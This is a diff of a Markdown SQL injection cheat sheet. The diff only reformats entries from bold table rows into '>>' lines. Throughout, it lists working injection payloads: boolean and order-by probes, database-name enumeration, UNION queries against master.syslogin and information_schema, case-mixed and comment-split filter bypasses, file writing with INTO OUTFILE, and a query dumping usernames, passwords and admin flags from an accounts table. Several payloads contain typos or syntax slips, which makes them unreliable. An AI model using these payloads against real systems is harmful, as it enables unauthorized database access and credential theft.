@@ -21,26 +21,26 @@ __Basic__
 __Medium:__
 
 
-| __1' and 1=1__ &nbsp;  | nbsp; True 
+>>  1' and 1=1 &nbsp;  | nbsp; True 
 
 
-| __1' and 1=0__ &nbsp;  |  &nbsp; False 
+>>  1' and 1=0 &nbsp;  |  &nbsp; False 
 
 
-| __1' order by 1 __ &nbsp; |  &nbsp; True
+>>  1' order by 1  &nbsp; |  &nbsp; True
 
 
-| __1' order by 10000__ &nbsp; | &nbsp; False
+>>  1' order by 10000 &nbsp; | &nbsp; False
 
 
-| __1 or db_name()=1);__ &nbsp;|  &nbsp;
+>>  1 or db_name()=1); &nbsp;|  &nbsp;
 
 
-| __1 or db_name(0)=1)__ &nbsp; | &nbsp; increase the number until the database does not show any errors
+>>  1 or db_name(0)=1) &nbsp; | &nbsp; increase the number until the database does not show any errors
 
 
 
-| __9999' UNION SELECT name,222,'else1' FROM master.syslogin; --__ 
+>> 9999' UNION SELECT name,222,'else1' FROM master.syslogin; -- 
 
 &nbsp;
 &nbsp;
@@ -48,15 +48,14 @@ __Medium:__
 
 __Complex:__
 
-| __union select 1, 2, 3 %23__                  &nbsp;&nbsp;  |  Bypass Web filters  | 
+>> union select 1, 2, 3 %23                  &nbsp;&nbsp;  |  Bypass Web filters  | 
 
 
-| __uNioN+sEleCt+1,2+%23__                      &nbsp;&nbsp;  |  Bypass Web filters  |  
+>> uNioN+sEleCt+1,2+%23                      &nbsp;&nbsp;  |  Bypass Web filters  |  
 
 
-| __uNioN`/**/`sEleCt`/**/`1,2`/**/`%23__       &nbsp;&nbsp;  |  Bypass Web filters  | 
-
-
+>> uNioN`/**/`sEleCt`/**/`1,2`/**/`%23       &nbsp;&nbsp;  |  Bypass Web filters  | 
+>>
 
 >> UniOn selEct 1,version() /*
 
@@ -82,14 +81,14 @@ __Complex:__
 >> UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*  Writing files 
 
 
->> union select 1, column_name, null, from Infromation_schema .columns where table_name = 0x769166__  &nbsp;&nbsp; | hex encoding                                                                                                                                dbname   
+>> union select 1, column_name, null, from Infromation_schema .columns where table_name = 0x769166  &nbsp;&nbsp; | hex encoding                                                                                                                                dbname   
 
 
->>  __' union select 1, column_name, null, null, null, 5 from Infromation_schema.columns where table_name = 'accounts'__ | 
+>>  ' union select 1, column_name, null, null, null, 5 from Infromation_schema.columns where table_name = 'accounts' | 
 
 
->>  __' union select username, pass, is_admin from 'accounts'__ &nbsp;&nbsp;  | 
+>>  ' union select username, pass, is_admin from 'accounts' &nbsp;&nbsp;  | 
 
 
->> __' union select 1, table_name, null, null, null, 5 from Infromation_schema.tables where table_schema = 'owasdb'__ |
+>>  ' union select 1, table_name, null, null, null, 5 from Infromation_schema.tables where table_schema = 'owasdb |
 
